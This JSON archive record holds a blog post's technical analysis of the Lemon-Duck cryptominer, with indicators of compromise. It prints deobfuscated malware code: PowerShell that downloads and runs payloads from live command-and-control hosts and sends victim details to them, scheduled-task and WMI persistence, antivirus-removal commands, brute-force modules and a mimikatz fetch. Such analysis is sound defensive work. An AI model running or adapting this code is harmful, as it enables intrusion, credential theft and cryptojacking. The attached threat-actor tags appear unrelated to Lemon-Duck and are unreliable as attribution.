{
    "id": "fb7b886a-59d4-4588-8a4b-5cd1b108eb36",
    "created_at": "2023-01-12T15:02:00.862312Z",
    "updated_at": "2025-03-27T02:05:45.437575Z",
    "deleted_at": null,
    "sha1_hash": "119ee1e50f4012943ba34e5f12a040040232bf7b",
    "title": "2021-06-02 - Lemon-Duck Cryptominer Technical Analysis",
    "authors": "",
    "file_creation_date": "2022-05-28T00:37:40Z",
    "file_modification_date": "2022-05-28T00:37:40Z",
    "file_size": 929033,
    "plain_text": "# Lemon-Duck Cryptominer Technical Analysis\n\n**[notes.netbytesec.com/2021/06/lemon-duck-cryptominer-technical.html](https://notes.netbytesec.com/2021/06/lemon-duck-cryptominer-technical.html)**\n\nFareed\n\n#### This blog post was authored by Fareed.\n\n## Summary\n\n#### Lemon Duck is a crypto-mining malware that targets infected computer resources to mine Monero cryptocurrency. This malware has a lot of capabilities and runs its payload mostly in memory which makes its presence stealthy in infected machines. The fileless infection of the malware is mainly using PowerShell modules. Phishing emails with a malicious document, SMB Remote Code Execution Vulnerability (CVE-2017-0144), and brute-force attacks were used to conduct internal network spreading while a malicious document was used to infect external victims. They also leverage some open source tools like XMRig, PingCastle, PowerSploit to achieve their goals.\n\n## Initial access\n\n\n-----\n\n#### The infection of this crypto miner begin on the victim in many ways.\n Phishing email with Malicious document as an attachment SMB exploit RDP brute-force USB infection SSH brute-force Pass the hash MS-SQL brute-force Redis remote command Yarn remote command\n\n Our Splunk detection team first detect a lot of suspicious communication were made to a domain name t[.]bb3u9[.]com as shown in below:\n```\nhttp://t.bb3u9.com/report.jsp?\n&redacted&redacted&redacted&7%20Professional%20_6.1.7600&1&redacted$redacted&H_R&Intel\n\n Our threat analyst team investigate the URL and realized that the URL is appended a lot of computer information include Windows version, hostname, and many more, which in our case, the infected victim information.\n Using VTGraph from VirusTotal, the domain was flagged as malicious by various security vendors. The domain also has communicated with a lot of malicious files which confirmed that the domain is malicious.\n\n```\n\n-----\n\n#### Figure 1: VTGraph result of domain t[.]bb3u9[.]com Tracking and hunting down the domain and few indicators of initial access in Splunk, we found that the malware was spread through Pass the hash method.\n\n## Which execution made the above request?\n\n#### After conducting a malware analysis on the sample, we observed that the above-mentioned request was made after the execution of a persistence mechanism PowerShell from Scheduler Task. The below figure shows scheduler task was created by the malware.\n\n Figure 2: Lemon Duck's scheduler task in our Windows VM analysis\n The format version of the Powershell code as below:\n\n\n-----\n\n```\nfunction a($u){\n  $d=(Ne`w-Obj`ect Net.WebC`lient).DownloadData($u);\n  $c=$d.count;  \n  if($c -gt 173){\n    $b=$d[173..$c];\n    $p=New-Object Security.Cryptography.RSAParameters;\n    $p.Modulus=\n[convert]::FromBase64String('2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTztic\n    $p.Exponent=0x01,0x00,0x01;\n    $r=New-Object Security.Cryptography.RSACryptoServiceProvider;\n    $r.ImportParameters($p);    \n    if($r.verifyData($b,(New-Object\nSecurity.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(join([char[]]$d[0..171])))){      \n      I`ex(-join[char[]]$b)\n    }}}\n$url='http://'+'t.bb3'+'u9.com';\na($url+'/a.jsp?rep_20210521?'+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject\nWin32_ComputerSystemProduct).UUID,(random))-join'*'))\n\n#### The above code will execute the final line of the code which will retrieve the content of a.jsp and invoke the content of a.jsp.\n\n## First stager\n\n#### But, one question that comes across in our mind is how the scheduler task was created?\n Our analyst then tracks the malware behavior based on the malware sample analysis and found out that the first stager PowerShell script from the malware does these scheduler task creation things.\n The following snippet decoded version of PowerShell code shows the full line of scheduler task payload is stored in variable $tmps.\n\n```\n\n-----\n\n```\n$tmps function a($u){$d (Ne w Obj ect Net.WebC lient). DownloadData\n($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object\nSecurity.Cryptography.RSAParameters;$p.Modulus=\n[convert]::FromBase64String(''xpVT7bCpITDUjAvmzli55WPVFPjQBos7o9/ZbbWzyeaKIn9NLJwvY6ad\nObject\nSecurity.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyDat\n(New-Object Security.Cryptography.SHA1CryptoServiceProvider),\n[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(join[char[]]$b)}}}$url=''http://''+''U1''+''U2'';a($url+''/a.jsp'+$v+'?''+\n(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,\n(random))-join''*''))'\n<--snippet-->\nif($sa){\n     schtasks /create /ru system /sc MINUTE /mo 60 /tn \"$tnf\\$tn\" /F /tr\n\"powershell -w hidden -c PS_CMD\"\n} else {\n     schtasks /create /sc MINUTE /mo 60 /tn \"$tnf\\$tn\" /F /tr \"powershell -w\nhidden -c PS_CMD\"\n}\n<--snippet-->\ntry{\nif($action.Arguments.Contains(\"PS_CMD\")){\n$folder.RegisterTask($task.Name,\n$task.Xml.replace(\"PS_CMD\",$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.subst\n 4, $null, $null, 0, $null)|out-null\n}\n\n#### The stager also drops WMI persistent mechanism.\nSet-WmiInstance -Class __EventFilter -NameSpace \"root\\subscription\" -Arguments\n@{Name=\"blackball1\";EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=\"SELECT *\nFROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA\n'Win32_PerfFormattedData_PerfOS_System'\";} -ErrorAction Stop\nforeach($u in $us){\n$theName=getRan\n$wmicmd=$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5)).replace('a\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" Arguments @{Filter=(Set-WmiInstance -Class __EventFilter -NameSpace\n\"root\\subscription\" -Arguments\n@{Name=\"f\"+$theName;EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=\"SELECT *\nFROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA\n'Win32_PerfFormattedData_PerfOS_System'\";} -ErrorAction Stop);Consumer=(SetWmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments\n@{Name=\"c\"+$theName;ExecutablePath=\"c:\\windows\\system32\\cmd.exe\";CommandLineTemplate=\"\n powershell -w hidden -c $wmicmd\"})}\n\n Other things to highlight for the first stager are few interesting functions like for example, Uninstall AV, Verify the current hostname has been infected or not, and deny access on ports 445 and 135.\n\n```\n\n-----\n\n#### The below snippet code shows the malware that uses the WMIC utility program to perform uninstallation of Anti Virus includes Eset, Avast, and many more.\n```\ncmd.exe /c start /b wmic.exe product where \"name like '%Eset%'\" call uninstall\n/nointeractive\ncmd.exe /c start /b wmic.exe product where \"name like '%%Kaspersky%%'\" call uninstall\n/nointeractive\ncmd.exe /c start /b wmic.exe product where \"name like '%avast%'\" call uninstall\n/nointeractive\ncmd.exe /c start /b wmic.exe product where \"name like '%avp%'\" call uninstall\n/nointeractive\ncmd.exe /c start /b wmic.exe product where \"name like '%Security%'\" call uninstall\n/nointeractive\ncmd.exe /c start /b wmic.exe product where \"name like '%AntiVirus%'\" call uninstall\n/nointeractive\ncmd.exe /c start /b wmic.exe product where \"name like '%Norton Security%'\" call\nuninstall /nointeractive\ncmd.exe /c \"C:\\Progra~1\\Malwarebytes\\Anti-Malware\\unins000.exe\" /verysilent\n/suppressmsgboxes /norestart\ncmd.exe /c rem https://technet.microsoft.com/enus/itpro/powershell/windows/defender/set-mppreference\ncmd.exe /c rem To also disable Windows Defender Security Center include this\ncmd.exe /c rem cmd.exe /c reg add\n\"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t\nREG_DWORD /d \"4\" /f\ncmd.exe /c rem 1 - Disable Real-time protection\ncmd.exe /c reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\ncmd.exe /c reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v\n\"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\ncmd.exe /c reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v\n\"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f\ncmd.exe /c reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v\n\"MpEnablePus\" /t REG_DWORD /d \"0\" /f\n\n The PowerShell code then will prepare a network environment such as deny access on ports 445 and 135 so that other malware can exploit SMB with the Eternal Blue exploit.\ncmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNSd\nnetsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1\nconnectport=53\nnetsh advfirewall firewall add rule name=\"deny445\" dir=in protocol=tcp localport=445\naction=block\nnetsh advfirewall firewall add rule name=\"deny135\" dir=in protocol=tcp localport=135\naction=block\n\n So, after the first stager is executed, it will set up the environment for the malware such as removing AV, deny access on port SMB and drop the persistent mechanism. Once the persistent PowerShell payload is executed, the malware then will retrieve and invoke the PowerShell command in the JSP file a.jsp.\n\n## Deobfuscating a.jsp\n\n```\n\n-----\n\n#### The content of a.jsp again was multi-encoded by the malware author.\n```\nI`EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(NewObject IO.MemoryStream\n(,$('edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472\n<--snippet-->\n6f5334f6bbfdfebfe4ce271fa5bfdb56dafc64fa71f5ac21564f3fbef3d1cf8cd3adad0bfae85b8ba7f5b7\nsplit'(..)'|?{$_}|%{[convert]::ToUInt32($_,16)}))),\n[IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\n\n Using PowerShell ISE, we then decode the above-encoded code to analyze the clean version of the payload just like we did with the first stager. The deobfuscation progress is shown from figure 3 to 6:\n$down_url = \"http://d.u78wjdu.com\"\nif(!$url){$url=\"http://t.bb3u9.com\"}\n$core_url = $url.split(\"/\")[0..2]-join\"/\"\n$permit = ([Security.Principal.WindowsPrincipal]\n[Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.Windo\n \"Administrator\")\n$comp_name = $env:COMPUTERNAME\n$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID\n$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ\n$true}).Macaddress | select-object -first 1\n$osb = (Get-WmiObject -class Win32_OperatingSystem)\n$os = $osb.Caption.replace(\"Microsoft Windows \",\"\")+\"_\"+$osb.Version\n$user = $env:USERNAME\n$domain = (Get-WmiObject win32_computersystem).Domain\n$uptime =\n[timespan]::FromMilliseconds([environment]::TickCount)|foreach{$_.totalseconds}\n$card = (Get-WmiObject Win32_VideoController).name\n$cpu_per = \"$((Get-WmiObject -Class Win32_Processor).LoadPercentage)\"\ngwmi Win32_PhysicalMemory | %{$msum = 0} { $msum += $_.Capacity };$mem=$msum/1Gb\n\n The malware download and runs various payloads called m6.bin, m6g.bin, kr.bin, if.bin, and nvd.zip into the disk.\n\n```\n\n-----\n\n```\nfunction stp($gra){\n  write-host $gra\n     Start-Process -FilePath cmd.exe -ArgumentList \"/c $gra\"\n}\nfunction gcf($code,$md,$fn){\n     ('echo\n'+$code+';$ifmd5='''+$md+''';$ifp=$env:tmp+''\\'+$fn+''';$down_url='''+$down_url+''';fu\n gmd5($con)\n{[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToStrin\n $s}if(test-path $ifp){$con_=[System.IO.File]::ReadAllBytes($ifp);$md5_=gmd5\n$con_;if($md5_-eq$ifmd5){$noup=1}}if(!$noup){$con=(Ne`w-Obj`ect\nNet.WebC`lient).downloaddata($down_url+''/'+$fn+'?'+$params+''');$t=gmd5 $con;if($teq$ifmd5){[System.IO.File]::WriteAllBytes($ifp,$con)}else{$noup=1}}if($noup)\n{$con=$con_;$ifmd5=$md5_}').replace('|','^^^|').replace('&','^^^&')\n}\nfunction gpa($fnam,$name){\n     ('for($i=0;$i -lt $con.count-1;$i+=1){if($con[$i] -eq 0x0a){break}};i`ex(join[char[]]$con[0..$i]);$bin=(New-Object IO.BinaryReader(New-Object\nSystem.IO.Compression.GzipStream (New-Object System.IO.MemoryStream(,$con[($i+1)..\n($con.count)])),\n([IO.Compression.CompressionMode]::Decompress))).ReadBytes(10000000);$bin_=$bin.Clone(\n[System.IO.File]::WriteAllBytes($mep,$bin_+((1..127)|Get-Random -Count 100));test1 PEBytes $bin').replace('|','^^^|').replace('&','^^^&')+\"|$name - &cmd /c copy /y\n%tmp%\\$fnam.ori %tmp%\\$fnam.exe & %tmp%\\$fnam.exe\"\n}\nfunction gpb($name){\n  'I`EX(-join[char[]]$con)|'+$name+' -'\n}\nfunction gcode($fl) {\n     'try{$local'+$fl+'=$flase;New-Object\nThreading.Mutex($true,''Global\\eLocal'+$fl+''',[ref]$local'+$fl+')}catch{}'\n}\n$code1=gcode \"If\"\nI`Ex $code1\nif($localIf){\n     stp ((gcf $code1 $ifmd5 $ifbin)+(gpb $rename))\n}\nif($is64){\n     $code2=gcode \"TMn\"\n     I`Ex $code2\n     if($localTMn){\n          stp ((gcf $code2 $mmd5 $mbin)+(gpa $mbin $rename))\n     }}\nif(($isn -or $isa) -and $is64){\n     $code3=gcode \"TMng\"\n     I`Ex $code3\n     if($localTMng){\n          stp ((gcf $code3 $mgmd5 $mgbin)+(gpa $mgbin $rename))\n     }}\n$code4=gcode \"Kr\"\nI`Ex $code4\nif($localKr){\n     stp ((gcf $code4 $krmd5 $krbin)+(gpb $rename))\n}\n\n```\n\n-----\n\n#### Function SIEX act as communication for CnC function code. When communicating with the attacker, the script sends a long URL containing all the information gathered about the environment, uniquely identifying the infected machine.\n```\nfunction SIEX { \n     Param(\n     [string]$url\n     )\n     try{\n          $webclient = Ne`w-Obj`ect Net.WebC`lient\n          $finalurl = \"$url\"+\"?\"+\"$params\"\n          try{\n              $webclient.Headers.add(\"User-Agent\",\"Lemon-Duck\"+$Lemon_Duck.replace('\\','-'))\n          } catch{}\n          $res_bytes = $webclient.DownloadData($finalurl)\n          if($res_bytes.count -gt 173){\n              $sign_bytes = $res_bytes[0..171];\n              $raw_bytes = $res_bytes[173..$res_bytes.count];\n              $rsaParams = New-Object\nSystem.Security.Cryptography.RSAParameters\n              $rsaParams.Modulus =\n0xda,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,0x41,0x5e,0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0\n              $rsaParams.Exponent = 0x01,0x00,0x01\n              $rsa = New-Object -TypeName\nSystem.Security.Cryptography.RSACryptoServiceProvider;\n              $rsa.ImportParameters($rsaParams)\n              $base64 = -join([char[]]$sign_bytes)\n              $byteArray = [convert]::FromBase64String($base64)\n              $sha1 = New-Object\nSystem.Security.Cryptography.SHA1CryptoServiceProvider\n              if($rsa.verifyData($raw_bytes,$sha1,$byteArray)) {\n                   IEX (-join[char[]]$raw_bytes)\n              }}\n     } catch{}}\nStart-Sleep -Seconds 3\nSIEX \"$core_url/report.jsp\"\n\n All downloaded payload were downloaded in the temp folder, which we can see on the figure\n\n below:\n\n Figure 7: payloads downloaded in temp folder\n\n```\n\n-----\n\n## Analyzing if.bin\n\n#### If.bin also has been obfuscated by the author.\n\n Figure 8: Obfuscated script\n We did the deobfuscation process and the script will be readable as shown in the figure below:\n\n Figure 9: Deobfuscated script\n Few important capabilities of the malicious files will explain below.\n First, the code containing PingCastle module which being use for port scanning to detect machines the respond on port 445. Thus, this will then launch SMB exploit on that scanned port. Snippet code as below:\n\n\n-----\n\n```\nnamespace PingCastle.Scanners\n{\n     public class m17sc\n     {\n          static public bool Scan(string computer)\n          {\n              TcpClient client = new TcpClient();\n              client.Connect(computer, 445);\n              try\n              {\n                   NetworkStream stream = client.GetStream();\n                   byte[] negotiatemessage = GetNegotiateMessage();\n                   stream.Write(negotiatemessage, 0,\nnegotiatemessage.Length);\n                   stream.Flush();\n                   byte[] response = ReadSmbResponse(stream);\n                   if (!(response[8] == 0x72 && response[9] == 00)){\n                   throw new InvalidOperationException(\"invalid\nnegotiate response\");}\n                   byte[] sessionSetup = GetR(response);\n<-- snippet -->\n\n#### RDP brute-forcing module is included to perform RDP brute force capability.\n\n```\n\n-----\n\n```\nnamespace RDP\n{\n  public class BRUTE\n  {\n          private int flag1=-1;\n          private bool check_login;\n          private Process process;\n          public void exit(){\n              if(!process.HasExited){\n                   process.Kill();};\n              process.Close();}\n    public int check(string exePath, string ip, string user, string pass, bool\nchecklogin){\n              try{\n                   check_login = checklogin;\n                   process = new System.Diagnostics.Process();\n                   process.StartInfo.FileName = exePath;\n                   if(checklogin){\n                        process.StartInfo.Arguments = \"/u:\"+user+\"\n/p:\"+pass+\" /cert-ignore /sec:nla /log-level:trace /size:700x700 /v:\"+ip;\n                   } else {\n                        process.StartInfo.Arguments = \"/u:\"+user+\"\n/p:\"+pass+\" /cert-ignore +auth-only /sec:nla /log-level:trace /v:\"+ip;}\n                   process.StartInfo.UseShellExecute = false;\n                   process.StartInfo.CreateNoWindow = true;\n                   process.StartInfo.RedirectStandardOutput = true;\n                   process.Start();\n                   process.BeginOutputReadLine();\n                   process.OutputDataReceived += new\nDataReceivedEventHandler(processOutputDataReceived);\n        System.Threading.Timer timer = new System.Threading.Timer(autoQuite,\nnull, 10000, 5000);\n<-- snippet -->\n\n#### Another infection method is via network drives and removable drives. It will create a .lnk file on these detected drives and execute the payload in the shortcut lnk.\n\n```\n\n-----\n\n```\npublic class USBLNK\n  {\n    public static List blacklist = new List();\n          public static string gb3;\n          public static string gb6;\n          public static string jsdata;\n    const string home = \"UTFsync\";\n    const string inf_data = \"\\\\inf_data\"\n<-- snippet -->\n          static bool IsSupported(DriveInfo drive) { return drive.IsReady &&\ndrive.AvailableFreeSpace > 1024 && (drive.DriveType == DriveType.Removable ||\ndrive.DriveType == DriveType.Network) && (drive.DriveFormat == \"FAT32\" ||\ndrive.DriveFormat == \"NTFS\");}\n          static bool CheckBlacklist(string name) { return name==home ||\nname==\"System Volume Information\" || name==\"$RECYCLE.BIN\";}\n          static bool Infect(string drive)\n    {\n      if (blacklist.Contains(drive)) {return true;}\n              CreateLnk(drive, \"blue3.bin\", gb3);\n              CreateLnk(drive, \"blue6.bin\", gb6);\n              CreateJs(drive, \"readme.js\", jsdata);\n      try{\n        File.Create(drive + home + inf_data);\n        return true;};\n\n#### Powerdump module being used to dumps hashes from the local system\n#######################################powerdump written by David\nKennedy#########################################\n$antpassword = [Text.Encoding]::ASCII.GetBytes(\"NTPASSWORD0\");\n$almpassword = [Text.Encoding]::ASCII.GetBytes(\"LMPASSWORD0\");\n$empty_lm =\n[byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0\n$empty_nt =\n[byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0\n$odd_parity = @(\n 1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,\n 16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,\n 32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,\n 49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,\n 64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,\n 81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,\n 97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,\n 112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,\n <-- snippet -->\n\n The script trying to get mimi.dat file which contain mimikatz payload.\n\n```\n\n-----\n\n```\n$mimipath $env:tmp+ \\mimi.dat \n$d_retry=3 \nwhile(!(Test-Path $mimipath) -or (Get-Item $mimipath).length -ne 3563487){\n     if($d_retry -eq 0){break}\n     write-host \"try to get mimi...\"\n     try{(new-object System.Net.WebClient).DownloadFile($down_url+\"/mimi.dat?\nv=$VVERSION&r=$d_retry\",$mimipath)}catch{}\n     $d_retry-     start-sleep 3\n}\n<-- snippet -->\n\n#### Another capability to highlight is MS-SQL brute-forcing code. It will attempt to brute force MS-SQL to gain access.\nwrite-host \"start mssql port open scanning...\"\n$ms_portopen = localscan -port 1433 -addresses $ipaddresses[$i..($i+$tcount-1)]\n$old_portopen = localscan -port 65529 -addresses $ms_portopen[1]\nforeach($currip in $ms_portopen[1]) {\n     if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){\n          write-host \"start mssql burping...$currip\"\n          for($n=0; $n -lt $allpass.count; $n++){\n              $flag=$false\n              write-host(\"Try pass: \"+$allpass[$n])\n              $flag,$banner = (mssqlrun -ip $currip -pass $allpass[$n] -cmd\n$mscmd_code -cmd1 $mscmd_code)[-2..-1]\n              if($flag) {\n                   try{(New-Object\nNet.WebClient).DownloadString($down_url+'/report.json?\nv='+$VVERSION+'&type=ms&iip='+$internet_ip+'&ip='+$currip+'&pass='+$allpass[$n]+'&t='+\n                        break}\n <-- snippet -->          \n\n Same goes to SSH bruteforce as shown below:\nwrite-host \"start ssh port open scanning...\"\n$ssh_portopen = localscan -port 22 -addresses $ipaddresses[$i..($i+$tcount-1)]\n$old_portopen = localscan -port 65529 -addresses $ssh_portopen[1]\nforeach($currip in $ssh_portopen[1]) {\n     if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){\n          write-host \"start ssh burping...$currip\"\n          foreach($password in $allpass){\n              write-host \"Try pass:$password\"\n              $flag1 = -1\n              $flag1 = sshbrute $currip \"root\" $password $ssh_code\n              if($flag1 -eq 1){\n              write-host \"SUCC!!\"\n              try{(New-Object\nNet.WebClient).DownloadString($down_url+'/report.json?\nv='+$VVERSION+'&type=ssh&iip='+$internet_ip+'&ip='+$currip+'&pass='+$password+'&t='+$t\n                   break\n<-- snippet -->\n\n```\n\n-----\n\n## m6.bin\n\n#### m6.bin is the executable that uses for the crypto miner. From the below-executed executable, the version of XMRig is 6.3.0.\n\n Figure 10: XMRig\n\n## Conclusion\n\n#### The malware is very stealthy as they leverage fileless execution on most of their payloads. The malware tends to infect and spread as many systems as possible as they implement multiple methods like brute force and exploit. Observing these malware trends shows that the malware author often changes the CnC infrastructure IP address and improves their malware capabilities. Thus, makes more system as their victims.\n\n## Indicator of Compromise\n\n\n-----\n\n### Hashes\n\n#### if.bin 8c4fba3df81475d075c535deae2cd373 kr.bin c95f97fccb0bd80fa524cf2bfb0390a8 m6.exe 4094140d07826334c345f8dc392d8fe3 mimi.dat a66953b8a3eeee7d5057ddf80b8be962\n\n### DNS request\n\n#### t.bb3u9.com t.pp6r1.com p.b69kq.com d.u78wjdu.com\n\n### IP connections\n\n#### 138.68.251.24 138.68.186.90 88.214.207.96 45.63.34.251 138.68.183.180 176.58.99.231\n\n## Extra (Deobfucation)\n\n#### Shout out to our internship students who managed to deobfuscate the obfuscated Powershell. Below is the links of their write-ups:\n 1. (shauqi): https://nightfury99.github.io/Malware-Deobfuscate/ 2. (Iqbal): https://mhdiqb-malware-analysis.blogspot.com/2021/06/exploits-analysis-jsp code-was-and-code.html 3. (malik): https://almalikzakwan.github.io/Lemon-DuckAnalysis/ 4. ( Rosa): https://bobalattew.github.io/How-to-deobfuscate-malware-using-Powershell/ 5. (Taqi): https://github.com/tx-qi/mail.jsp-writeup 6. (Izzat): https://github.com/Izzathajar/malware-diobfuscated/tree/gh-pages 7. (Aina): https://hello-world9.github.io/fileless-attack-analysis/ 8. (Nadzirah): https://nadzirahmdisa.blogspot.com/2021/06/in-memory-attack-writeup.html\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-02 - Lemon-Duck Cryptominer Technical Analysis.pdf"
    ],
    "report_names": [
        "2021-06-02 - Lemon-Duck Cryptominer Technical Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535720,
    "ts_updated_at": 1743041145,
    "ts_creation_date": 1653698260,
    "ts_modification_date": 1653698260,
    "files": {
        "pdf": "https://archive.orkl.eu/119ee1e50f4012943ba34e5f12a040040232bf7b.pdf",
        "text": "https://archive.orkl.eu/119ee1e50f4012943ba34e5f12a040040232bf7b.txt",
        "img": "https://archive.orkl.eu/119ee1e50f4012943ba34e5f12a040040232bf7b.jpg"
    }
}